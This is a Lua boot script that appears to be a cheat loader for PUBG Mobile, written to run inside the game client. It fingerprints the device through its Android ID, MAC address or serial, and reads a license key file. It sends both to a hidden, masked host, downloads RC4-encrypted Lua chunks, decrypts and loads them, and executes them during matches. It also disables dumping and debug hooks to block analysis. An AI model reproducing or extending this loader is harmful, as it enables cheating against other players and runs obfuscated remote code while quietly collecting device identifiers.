--[[ NEXTLVL-BOOT ]] do
------------------------------------------------------------------
-- crypto primitives (pure Lua 5.1, no bit lib required)
------------------------------------------------------------------
local _NIB = {}
do
  for _a = 0, 15 do
    for _b = 0, 15 do
      local _r, _x, _y, _p = 0, _a, _b, 1
      for _ = 1, 4 do
        if (_x % 2) ~= (_y % 2) then _r = _r + _p end
        _x = math.floor(_x / 2)
        _y = math.floor(_y / 2)
        _p = _p * 2
      end
      _NIB[_a * 16 + _b] = _r
    end
  end
end

local function _bx(_x, _y)
  return _NIB[math.floor(_x / 16) * 16 + math.floor(_y / 16)] * 16
       + _NIB[(_x % 16) * 16 + (_y % 16)]
end

local function _rc4(_key, _data)
  local _S = {}
  for _i = 0, 255 do _S[_i] = _i end
  local _j, _kl = 0, #_key
  for _i = 0, 255 do
    _j = (_j + _S[_i] + string.byte(_key, (_i % _kl) + 1)) % 256
    _S[_i], _S[_j] = _S[_j], _S[_i]
  end
  local _i, _j2 = 0, 0
  local _out = {}
  local _n = 0
  for _k = 1, #_data do
    _i = (_i + 1) % 256
    _j2 = (_j2 + _S[_i]) % 256
    _S[_i], _S[_j2] = _S[_j2], _S[_i]
    _n = _n + 1
    _out[_n] = string.char(_bx(string.byte(_data, _k), _S[(_S[_i] + _S[_j2]) % 256]))
  end
  return table.concat(_out)
end

local _B64M = {}
do
  local _B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  for _i = 1, 64 do _B64M[string.sub(_B, _i, _i)] = _i - 1 end
end

local function _b64d(_s)
  local _t = {}
  local _n = 0
  local _i = 1
  local _l = #_s
  while _i <= _l do
    local _c1 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c2 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c3s = string.sub(_s, _i, _i); _i = _i + 1
    local _c4s = string.sub(_s, _i, _i); _i = _i + 1
    local _c3 = _c3s ~= "=" and _B64M[_c3s] or 0
    local _c4 = _c4s ~= "=" and _B64M[_c4s] or 0
    _n = _n + 1
    _t[_n] = string.char(_c1 * 4 + math.floor(_c2 / 16))
    if _c3s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c2 % 16) * 16 + math.floor(_c3 / 4))
    end
    if _c4s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c3 % 4) * 64 + _c4)
    end
  end
  return table.concat(_t)
end

local _ld = loadstring or load

local _LOG_FILE = "/storage/emulated/0/Android/data/com.pubg.imobile/files/Myweowlogs.txt"
local function _log(_msg)
  pcall(function()
    local _f = io.open(_LOG_FILE, "a")
    if _f then
      _f:write(os.date("%Y-%m-%d %H:%M:%S") .. " | " .. tostring(_msg) .. "\n")
      _f:flush()
      _f:close()
    end
  end)
end

------------------------------------------------------------------
-- anti-dump prelude (run before anything sensitive is loaded)
------------------------------------------------------------------
pcall(function() rawset(string, "dump", nil) end)
pcall(function()
  if debug then
    rawset(debug, "sethook", function() error("blocked", 2) end)
    rawset(debug, "debug", nil)
  end
end)
local _tainted = false
pcall(function()
  if _G.mobdebug or (package.loaded and package.loaded["mobdebug"]) then _tainted = true end
end)

------------------------------------------------------------------
-- config (generated at build time, masked)
------------------------------------------------------------------
local _cfg = {
  v = @@CFG_VER@@,
  m = @@CFG_MASK@@,
  mk = @@CFG_MK@@,
  ho = @@CFG_HOST@@,
}

local function _dec(_arr)
  local _out = {}
  for _i = 1, #_arr do
    _out[_i] = string.char(_bx(_arr[_i], _cfg.m[(_i - 1) % #_cfg.m + 1]))
  end
  return table.concat(_out)
end

local _HOST = _dec(_cfg.ho)
local _MK = _dec(_cfg.mk)
local _V = _cfg.v
_cfg = nil
_log("========== NEXTLVL-BOOT v" .. _V .. " ==========")
_log("host=" .. _HOST)

------------------------------------------------------------------
-- device id (silent multi-layer)
------------------------------------------------------------------
local _DID = ""
pcall(function()
  local _S = import("SystemUtil")
  if _S and _S.GetAndroidID then
    local _id = _S:GetAndroidID() or ""
    if _id ~= "" and _id ~= "9774d56d682e549c" then _DID = _id end
  end
end)
if _DID == "" then
  pcall(function()
    local _lj = require("luajava")
    if _lj then
      local _c = _lj.bindClass("android.app.ActivityThread"):currentApplication():getApplicationContext()
      local _w = _c:getSystemService("wifi")
      if _w then
        local _m = _w:getConnectionInfo():getMacAddress() or ""
        if _m ~= "" and _m ~= "02:00:00:00:00:00" then _DID = _m end
      end
    end
  end)
end
if _DID == "" then
  pcall(function()
    local _lj = require("luajava")
    if _lj then
      local _B = _lj.bindClass("android.os.Build")
      local _s = _B.SERIAL or ""
      if _s ~= "" and _s ~= "unknown" then _DID = _s end
    end
  end)
end
if _DID == "" then
  local _IDF = "/storage/emulated/0/Android/data/com.pubg.imobile/files/.device_id"
  pcall(function()
    local _f = io.open(_IDF, "r")
    if _f then
      local _id = string.gsub(_f:read("*all") or "", "%s+", "")
      _f:close()
      if _id ~= "" and #_id >= 10 then _DID = _id end
    end
  end)
end
if _DID == "" then
  local _ts = os.time()
  local _rd = math.random(1000000000, 9999999999)
  _DID = string.format("DEV_%x_%x", _ts, _rd)
  pcall(function()
    local _f = io.open(_IDF, "w")
    if _f then _f:write(_DID) _f:close() end
  end)
end
_log("device_id=" .. _DID)

------------------------------------------------------------------
-- key file
------------------------------------------------------------------
local _KEY = ""
pcall(function()
  local _f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/key.txt", "r")
  if _f then
    _KEY = string.gsub(_f:read("*all") or "", "%s+", "")
    _f:close()
  end
end)
_log("key=" .. (_KEY ~= "" and _KEY or "EMPTY"))

------------------------------------------------------------------
-- state
------------------------------------------------------------------
local _http = nil
local _session = ""
local _files = {}
local _chunks = {}
local _executed = false
local _abort = false
local _phase = "validate"
local _last = 0
local _tries = 0
local _fi = 1

local function _getHttp()
  if _http then return _http end
  pcall(function()
    local _m = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
    if _m and _m.Post then _http = _m end
  end)
  if not _http then _log("ERROR http manager not found") end
  return _http
end

local function _post(_path, _payload, _cb)
  local _h = _getHttp()
  if not _h then _cb(false, nil) return end
  _h:Post(_HOST .. _path, { ["Content-Type"] = "application/json", ["Accept"] = "application/json" }, _payload, nil, _cb, 8)
end

local function _validate()
  _tries = _tries + 1
  if _tries > 20 then _abort = true _log("ABORT validate retries exhausted") return end
  _post("/validate", string.format('{"key":"%s","device_id":"%s"}', _KEY, _DID), function(_ok, _data)
    if not _ok then _log("validate http fail (attempt " .. _tries .. ")") return end
    if not _data then _log("validate no data (attempt " .. _tries .. ")") return end
    local _ok2, _r = pcall(json.decode, _data)
    if not _ok2 then _log("validate json decode err: " .. tostring(_r)) return end
    if not _r or not _r.valid then
      _log("validate rejected (attempt " .. _tries .. "): " .. tostring(_r and _r.error or "invalid"))
      return
    end
    _session = _r.session or ""
    _files = _r.allowed_files or {}
    _log("validate OK session=" .. _session:sub(1, 8) .. " files=" .. table.concat(_files, ","))
    if _session ~= "" and #_files > 0 then
      _phase = "fetch"
      _tries = 0
    end
  end)
end

local function _fetchNext()
  _tries = _tries + 1
  if _tries > 30 then _abort = true _log("ABORT fetch retries exhausted") return end
  if _fi > #_files then
    _phase = "wait"
    _tries = 0
    _log("all chunks fetched, waiting for match")
    return
  end
  local _f = _files[_fi]
  if _chunks[_f] then
    _fi = _fi + 1
    _fetchNext()
    return
  end
  _log("fetching " .. _f .. " (attempt " .. _tries .. ")")
  _post("/g", string.format('{"session":"%s","dev":"%s","f":"%s"}', _session, _DID, _f), function(_ok, _data)
    if not _ok or not _data then _log("fetch " .. _f .. " http fail") return end
    local _ok2, _r = pcall(json.decode, _data)
    if not _ok2 then _log("fetch " .. _f .. " json err: " .. tostring(_r)) return end
    if not _ok2 or not _r or not _r.ok or not _r.data or #_r.data <= 32 then
      _log("fetch " .. _f .. " rejected: " .. tostring(_r and _r.error or "short data"))
      return
    end
    local _raw = _b64d(_r.data)
    local _key = _MK .. _f
    local _plain = _rc4(_key, _raw)
    local _fn, _err = _ld(_plain, "@" .. _f)
    _plain = nil
    _raw = nil
    if _fn then
      _chunks[_f] = _fn
      _log("chunk " .. _f .. " decrypted+loaded OK")
      _fi = _fi + 1
      _tries = 0
      _fetchNext()
    else
      _log("chunk " .. _f .. " loadstring err: " .. tostring(_err))
    end
  end)
end

local function _ready()
  local _ok1, _m1 = pcall(require, "GameLua.GameCore.Data.GameplayData")
  local _ok2, _m2 = pcall(require, "GameLua.GameCore.Framework.CharacterBase")
  local _ok3, _m3 = pcall(require, "combine_class")
  if not (_ok1 and _m1 and _ok2 and _m2 and _ok3 and _m3) then
    _log("not ready: GameplayData=" .. tostring(_ok1 and _m1 ~= nil) .. " CharacterBase=" .. tostring(_ok2 and _m2 ~= nil) .. " combine_class=" .. tostring(_ok3 and _m3 ~= nil))
    return false
  end
  local _hasStatus = false
  local _inBattle = false
  pcall(function()
    if GameStatus and GameStatus.GetGameStatus and GameStatus.Battle then
      _hasStatus = true
      _inBattle = (GameStatus.GetGameStatus() == GameStatus.Battle)
    end
  end)
  if _hasStatus then
    _log("ready check: modules OK, status gate " .. (_inBattle and "BATTLE" or "NOT-BATTLE"))
    return _inBattle
  end
  _log("ready check: modules OK, no GameStatus gate")
  return true
end

local function _exec()
  if _tainted then
    _abort = true
    _log("ABORT mobdebug/taint detected")
    return
  end
  for _i = 1, #_files do
    local _f = _files[_i]
    local _fn = _chunks[_f]
    if _fn then
      _log("executing " .. _f)
      local _ok, _err = pcall(_fn)
      if _ok then
        _log("executed " .. _f .. " OK")
      else
        _log("exec " .. _f .. " ERROR: " .. tostring(_err))
      end
      _chunks[_f] = nil
    else
      _log("exec skip " .. _f .. " (not loaded)")
    end
  end
  _executed = true
  _G._NEXTLVL_VER = _V
  _log("========== ALL DONE (ver " .. _V .. ") ==========")
  collectgarbage("collect")
end

local function _poll(_dt)
  if _abort or _executed then return end
  local _now = os.time()
  if _now == _last then return end
  _last = _now
  if _KEY == "" or _DID == "" then return end
  if _phase == "validate" then
    _validate()
  elseif _phase == "fetch" then
    _fetchNext()
  elseif _phase == "wait" then
    if _ready() then _exec() end
  end
end

if game_frontend_hud and game_frontend_hud.SetSluaTickListener then
  game_frontend_hud.SetSluaTickListener(_poll)
  _log("tick listener registered")
end

end